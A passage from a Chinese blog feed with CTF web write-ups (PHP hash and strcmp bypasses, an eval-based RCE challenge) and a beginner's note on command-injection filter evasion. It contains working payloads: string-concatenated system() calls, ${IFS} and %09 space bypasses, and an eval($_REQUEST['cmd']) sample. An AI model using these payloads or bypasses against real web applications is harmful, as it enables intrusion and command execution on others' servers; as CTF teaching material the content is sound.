class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-comment">//一共五个绕过，都拿下后会读.flag的内容。</span><br></code></pre></td></tr></table></figure><p>先是key1key2不相等但md5加密后弱相等。这东西可以用碰撞也可以用两个东西加密后得0e开头的字符串。如果要求强相等的话直接让key1key2是两个数组就行了(无法对数组加密会返回null)。</p><p><code>?key1[]=1&amp;key2[]=2</code></p><p>第二个条件同理，其实我之前还真没碰到过这种条件(一个东西MD5加密后等于该东西SHA1加密后的值)。我当时想着既然都是hash函数那就让key3等于数组呗(强相等绕过)，结果还真绕过了。</p><p><code>strcmp</code>这东西会比较两个字符串中对应位置的ASCII大小，如果相同就继续比较下一个。<code>str1&gt;str2</code>就返回大于0，相同返回0，<code>str1&lt;str2</code>就返回小于0。</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code>题目意思是想让我们输入的<code>key4</code>和<code>flag</code>相等，但我们根本不知道<code>flag</code>是多少。这时可以让<code>key4</code>是一个数组，<code>strcmp</code>比较的是字符串，如果传入其它类型会报错。出错会返回0，实现绕过。</p><p><code>is_numeric</code>，这个简单，直接<code>key5=2024a</code>即可。</p><p>最后一步POST传<code>key3[]=~&amp;flag5=~</code>，只要数组的值别触发正则匹配就行。</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>password经MD5加密后前六位强等于<code>&quot;c4d038&quot;</code>，这东西要写个脚本找，直接用之前做题的脚本改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>():<br>    mubiao = <span class="hljs-string">&#x27;c4d038&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        string = <span class="hljs-built_in">str</span>(i)<br>        hash_object = hashlib.md5(string.encode())<br>        <span class="hljs-keyword">if</span> hash_object.hexdigest()[:<span class="hljs-number">6</span>] == mubiao: <span class="hljs-comment">#切片操作，从零开始取六位</span><br>            <span class="hljs-keyword">return</span> string<br>        i += <span class="hljs-number">1</span><br><br>result = find()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#结果：114514</span><br></code></pre></td></tr></table></figure><p>接下来要给<code>e_v.a.l</code>参数赋值，而且传过去的值经过正则匹配过滤后会被eval执行。<code>e_v.a.l</code>这东西很明显不满足变量名的要求：包含了小数点。看下PHP官方的解释：</p><p><img src="/img/a19.png" alt="a19"></p><p>写一小段代码体会一下咋回事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POST传<code>e_v.a.l=&#39;hellowold!&#39;</code>：</p><p>结果：<code>array(1) &#123;  [&quot;e_v_a_l&quot;]=&gt;  string(12) &quot;&#39;hellowold!&#39;&quot; &#125;</code></p><p>可以看到POST传递的参数从<code>e_v.a.l</code>变成了<code>e_v_a_l</code>，空格同理。(但<code>e_v.a.l</code>参数仍没被赋值)。</p><p>这里 引用下mochu师傅的解释：</p><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p><p>还是上面那串代码，尝试<code>post</code>传参<code>e[v.a.l=&#39;hellowold!&#39;</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;e_v.a.l&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;&#x27;hellowold!&#x27;&quot;</span> &#125;<br>hello<br></code></pre></td></tr></table></figure><p>成功绕过。</p><p>接下来就是怎么绕正则匹配过滤了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>); <br></code></pre></td></tr></table></figure><p>过滤了flag,那猜测flag是藏在&#x2F;flag底下的，直接使用通配符：<code>/fl*</code>即可。过滤了<code>system</code>可以使用<code>(sy.(st).em)</code>绕过(字符串拼接)。过滤了<code>cat</code>那就用<code>tac</code>。这道题过滤地并不怎么严格。</p><p>payload:</p><p>password&#x3D;114514&amp;e[v.a.l&#x3D;(sy.(st).em)(<code>printf &quot;\154\163&quot;</code>);  注意printf前和163“后各有一个反引号。</p><p>这里关于绕过的一些知识在之前写的博客里说了些，就不详细写了(比较懒，哈哈)。</p><p>非法参数名传参的问题参考了这位师傅的文章，感谢！</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>题目描述：简简单单、随心所欲</p><p><img src="/img/a20.png" alt="a20"></p><p>感觉又是最讨厌的SQL注入。。。</p><p>先看看源码里有没有啥东西，主要看看他这个用户名密码是怎么限制的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value, type</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;un&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名长度必须为3-10个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;pw&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">18</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码长度必须为6-18个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9!@#$%^&amp;_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>先注册一下：</p><p><img src="/img/a21.png" alt="a21"></p><p>但提示admin已经被注册过了？弱口令试了挺多但没啥用，登不上去。那就随便注册一个：</p><p><img src="/img/a22.png" alt="a22"></p><p>登录后发现跳转到这么个界面:这玩意儿跟个复读机似的，你打啥东西他就把<code>你</code>和<code>您</code>换成<code>我</code>。<code>吗</code>给换成空格，<code>?</code>换成<code>!</code>。而且这东西不用数据包(???)，burpsuite抓包根本没用。。</p><p>它跳转的时候想到了302重定向的问题，就一直开着burpsuite排查，发现这么个东西：</p><p><img src="/img/a23.png" alt="a23"></p><p>结果那个bv是这么个东西：</p><p><img src="/img/a24.png" alt="a24"></p><p>看这标题我就感觉不对劲了，翻简介的时候根本没有第七行。。(#$$#$%^$#@#$%$#@@#$%^&amp;)。</p><p>如果是SQL注入的话，不知道注入点在哪里。试了挺多弱口令也没试出来。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment">//e[v.a.l=11</span><br></code></pre></td></tr></table></figure><p>感谢mochu师傅的文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE中一些常见的绕过方法</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><p><strong>命令执行漏洞前提条件：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.存在可调用执行系统命令的函数。<br>2.该函数参数可控。<br>3.对参数过滤不严格。<br></code></pre></td></tr></table></figure><p><strong>一些常见可以执行命令的函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-number">1</span>.<span class="hljs-keyword">eval</span>()<span class="hljs-comment">//把一串字符串作为PHP代码执行</span><br><span class="hljs-number">2</span>.<span class="hljs-title function_ invoke__">system</span>()/<span class="hljs-title function_ invoke__">passthru</span>()/<span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-number">3</span>.<span class="hljs-title function_ invoke__">call_user_func</span>()/<span class="hljs-title function_ invoke__">call_user_func_array</span>() <span class="hljs-comment">//回调函数</span><br><span class="hljs-number">4</span>.<span class="hljs-title function_ invoke__">creat_function</span>()<br><span class="hljs-number">5</span>.shell_exec <span class="hljs-comment">//注意这玩意儿没回显，不过可以通过把它传给某个文件或者echo的方法看执行结果，比如：</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -l&#x27;</span>); <span class="hljs-comment">// 执行ls -l命令并将输出保存到$output变量中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>     /?cmd=ls -al / &gt; viper3.txt<br><span class="hljs-number">6</span>.还可以用反引号``和$()执行命令。<br><span class="hljs-number">7</span>.preg_match的/e模式漏洞。<br></code></pre></td></tr></table></figure><p>最后那个&#x2F;e模式好像已经被弃用好久了。。举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(\d+)/e&#x27;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;&quot;$1&quot; + 1&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// 输出124</span><br></code></pre></td></tr></table></figure><p><code>/(\d+)/e</code>模式匹配一个或多个数字，并使用<code>&quot;$1&quot; + 1</code>作为替换字符串。在替换过程中，<code>&quot;$1&quot;</code>被解析为匹配的数字，然后加1。因此，最终的替换结果是123 + 1，即124。</p><p><strong>管道符(Windows)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></code></pre></td></tr></table></figure><p><img src="/img/b2.png" alt="b2"></p><p><img src="/img/b3.png" alt="b3"></p><p><strong>管道符(Linux)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br>;       前后命令都要执行，无论前面真假<br></code></pre></td></tr></table></figure><p><strong>空格绕过(ls &#x2F;和cat等均需空格)：</strong></p><p>1.${IFS}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$&#123;IFS&#125;/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>2.$IFS$9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$IFS$9/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>3.%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p><p><img src="/img/b4.png" alt="b4"></p><p>4.&lt;和&lt;&gt;重定向符号</p><p>在Linux中，<code>&lt;</code>是用于重定向输入的符号，它将一个文件的内容作为命令的输入。<code>&lt;</code>符号后面跟着文件名，表示将该文件的内容作为命令的输入。</p><p>例如，假设有一个名为input.txt的文件，包含了一些文本内容。可以使用<code>&lt;</code>符号将input.txt文件的内容作为命令的输入，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt; input.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将input.txt文件的内容作为command命令的输入。</p><p>另外，<code>&gt;</code>符号用于重定向输出，它将命令的输出保存到一个文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。</p><p>而<code>&gt;&gt;</code>符号则用于追加输出，它将命令的输出追加到一个文件的末尾，而不是覆盖原有内容。</p><p>例如，假设有一个名为output.txt的文件，可以使用<code>&gt;</code>符号将命令的输出保存到output.txt文件中，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command &gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出保存到output.txt文件中。</p><p>而使用<code>&gt;&gt;</code>符号可以将命令的输出追加到output.txt文件的末尾，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt;&gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出追加到output.txt文件的末尾。</p><p>总结起来，<code>&lt;</code>用于重定向输入，<code>&gt;</code>用于重定向输出，<code>&gt;&gt;</code>用于追加输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat&lt;hello.txt<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ cat&lt;&gt;hello.txt<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>注意这东西没法和ls配合使用。</p><p>5.利用{}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ &#123;ls,/&#125;<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  